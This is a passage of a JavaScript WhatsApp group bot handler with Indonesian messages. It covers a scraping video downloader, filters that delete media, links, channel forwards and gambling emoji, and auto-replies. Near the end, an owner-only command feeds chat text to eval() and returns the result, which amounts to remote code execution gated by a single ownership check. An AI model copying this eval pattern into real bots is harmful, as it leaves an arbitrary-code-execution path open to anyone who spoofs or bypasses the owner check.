                            thumb: item.image,
                            url: item.video_file_url || item.videoimg_file_url
                        }))
                    } else {
                        throw new Error('Respons server tidak sesuai, coba link lain!')
                    }

                } catch (err) {
                    throw new Error(`Gagal proses download: ${err.message}`)
                }
            }


            async function sendMediaAutoType(url, title) {
                try {
                    const axios = require('axios')
                    const { fromBuffer } = require('file-type')

                    const res = await axios.get(url, { responseType: 'arraybuffer' })
                    const buff = Buffer.from(res.data)
                    const fileInfo = await fromBuffer(buff)

                    if (!fileInfo) return reply(`Gagal deteksi tipe file: ${title}`)

                    const mime = fileInfo.mime
                    const ext = fileInfo.ext

                    if (mime.startsWith('video/')) {
                        await sock.sendMessage(m.chat, { video: buff, caption: title }, { quoted: fakeQuoted })

                    } else if (mime.startsWith('audio/')) {
                        await sock.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: fakeQuoted })

                    } else if (mime.startsWith('image/')) {
                        await sock.sendMessage(m.chat, { image: buff, caption: title }, { quoted: fakeQuoted })

                    } else {
                        await sock.sendMessage(m.chat, {
                            document: buff,
                            fileName: `${title}.${ext}`,
                            mimetype: mime
                        }, { quoted: fakeQuoted })
                    }

                } catch (err) {
                    reply(`Gagal kirim media: ${err.message}`)
                }
            }


            // PROSES UTAMA
            const initialUrl = 'https://on4t.com/online-video-downloader'
            const downloadUrl = 'https://on4t.com/all-video-download'

            const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
            const results = await postDownloadRequest(downloadUrl, budy, csrfToken, cookies)

            for (let i = 0; i < results.length; i++) {
                await sendMediaAutoType(results[i].url, results[i].title)
            }

            await sock.sendMessage(m.chat, { react: { text: 'ğŸ’•', key: m.key } })

        } catch (err) {
            await sock.sendMessage(m.chat, { react: { text: 'ğŸ˜³', key: m.key } })
            reply(err.message)
        }
    }
}            
// Anti Video
if (db.chats[m.chat].antivideo && m.mtype === 'videoMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  await addWarning(sock, m, "Mengirim video", pushname)
}

// Anti Foto
if (db.chats[m.chat].antifoto && m.mtype === 'imageMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  await addWarning(sock, m, "Mengirim foto", pushname)
}

// Anti Audio
if (db.chats[m.chat].antiaudio && m.mtype === 'audioMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  await addWarning(sock, m, "Mengirim audio", pushname)
}

// Anti Dokumen
if (db.chats[m.chat].antidokumen && m.mtype === 'documentMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  await addWarning(sock, m, "Mengirim dokumen", pushname)
}

// Anti Sticker
if (db.chats[m.chat].antisticker && m.mtype === 'stickerMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  await addWarning(sock, m, "Mengirim sticker", pushname)
}

// Anti Tag Status
if (db.chats[m.chat].antimention && m.mtype === 'groupStatusMentionMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  await addWarning(sock, m, "Mengirim sticker", pushname)
}

// Anti Wa.me
if (db.chats[m.chat].antiWame && budy.includes('https://wa.me')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan wa.me", pushname)
}

// Anti Link Grup
if (db.chats[m.chat].Antilinkgc && budy.includes('https://chat.whatsapp')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan grup", pushname)
}

// Anti Link Channel
// =====================
// ğŸš« ANTI CHANNEL (FORWARD + LINK)
// =====================
if (chat.antichannel && m.text) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  let text = m.text.toLowerCase()

  // 1ï¸âƒ£ LINK CHANNEL WHATSAPP
  let channelLinkRegex = /https?:\/\/(www\.)?whatsapp\.com\/channel\/[a-z0-9]+/i

  // 2ï¸âƒ£ PESAN HASIL FORWARD DARI CHANNEL
  let isFromChannel =
    m.message?.extendedTextMessage?.contextInfo?.forwardedNewsletterMessageInfo ||
    m.message?.imageMessage?.contextInfo?.forwardedNewsletterMessageInfo ||
    m.message?.videoMessage?.contextInfo?.forwardedNewsletterMessageInfo ||
    m.message?.documentMessage?.contextInfo?.forwardedNewsletterMessageInfo

  if (!channelLinkRegex.test(text) && !isFromChannel) return

  // DELETE MESSAGE
  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  // WARNING
  let reason = channelLinkRegex.test(text)
    ? "Mengirim link Channel WhatsApp"
    : "Meneruskan pesan dari Channel"

  await addWarning(sock, m, reason, pushname)
}

// Anti Semua Link
if (db.chats[m.chat].Antilinkall && budy.includes('https://')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan", pushname)
}

// Anti Judol ğŸ¤‘
if (db.chats[m.chat].antijudol && budy.includes('ğŸ¤‘')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Simbol judi ğŸ¤‘", pushname)
}

// Anti Judol ğŸ’¸
if (db.chats[m.chat].antijudol2 && budy.includes('ğŸ’¸')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Simbol judi ğŸ’¸", pushname)
}
//
global.salam = true
if (global.salam)
  if (budy.includes("ssalamu")) {

			    sock.sendMessage(from, {text:`waalaikumsalam`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
if ((budy.match) && ["bot"].includes(budy)) {

			    sock.sendMessage(m.chat, {
        audio: {
          url: "https://raw.githubusercontent.com/zionjs0/whatsapp-media/main/file_1762425260617.m4a"
        },
        mimetype: 'audio/mpeg',
        ptt: false
      }, {
        quoted: fakeQuoted
      })
}
//
                if (budy.startsWith('<')) {
                    if (!isOwner) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})      